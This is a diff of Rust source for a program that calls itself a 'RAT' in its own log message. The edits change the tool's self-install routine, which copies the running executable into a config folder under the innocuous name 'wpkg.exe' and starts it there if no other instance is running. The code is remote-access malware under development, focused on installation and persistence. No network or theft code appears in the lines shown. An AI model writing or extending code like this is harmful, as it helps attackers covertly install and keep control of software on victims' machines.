@@ -41,12 +41,9 @@ async fn main() {
     #[cfg(not(target_os = "windows"))]
     warn!("RAT isn't runned on Windows. Some features may be unavailable. Use for debug only");
 
-    println!("{}",crate::utils::Utils::get_working_dir());
-
-    #[cfg(target_os = "windows")]
+    #[cfg(target_os = "linux")]
     {
         use crate::utils::Utils;
-        use platform_dirs::AppDirs;
         use std::env;
         use std::fs;
         use std::process;
@@ -56,21 +53,13 @@ async fn main() {
         let install = || -> anyhow::Result<()> {
             let exe_path = env::current_exe()?.display().to_string();
 
-            let app_dirs = AppDirs::new(Some("WPKG"), true).unwrap();
-            let config_dir = app_dirs.config_dir.display().to_string();
-
-            let exe_target = format!("{}\\{}", config_dir, "wpkg.exe");
+            let config_dir = Utils::get_working_dir();
+            let exe_target = format!("{}\\{}", &config_dir, "wpkg.exe");
 
             Utils::messagebox(format!("{} - {}",exe_path,exe_target));
 
             if exe_path != exe_target {
-                info!("WPKG not installed. Installing in {}...", config_dir);
-
-                if !Path::new(&config_dir).exists()
-                {
-                    info!("WPKG dir not exists... Creating it...");
-                    fs::create_dir(config_dir)?;
-                }
+                info!("WPKG not installed. Installing in {}...", &config_dir);
 
                 if !Path::new(&exe_target).exists()
                 {
@@ -90,7 +79,7 @@ async fn main() {
                 if runned <= 1
                 {
                     info!("Running WPKG...");
-                    Utils::run_process(&exe_target, "", false);
+                    Utils::run_process_with_work_dir(&exe_target, "", false,&config_dir);
                 }
                 else
                 {
@@ -101,7 +90,6 @@ async fn main() {
             }
             Ok(())
         };
-        //coś
 
         if let Err(err) = install() {
             error!("Failed to install WPKG: {}", err);
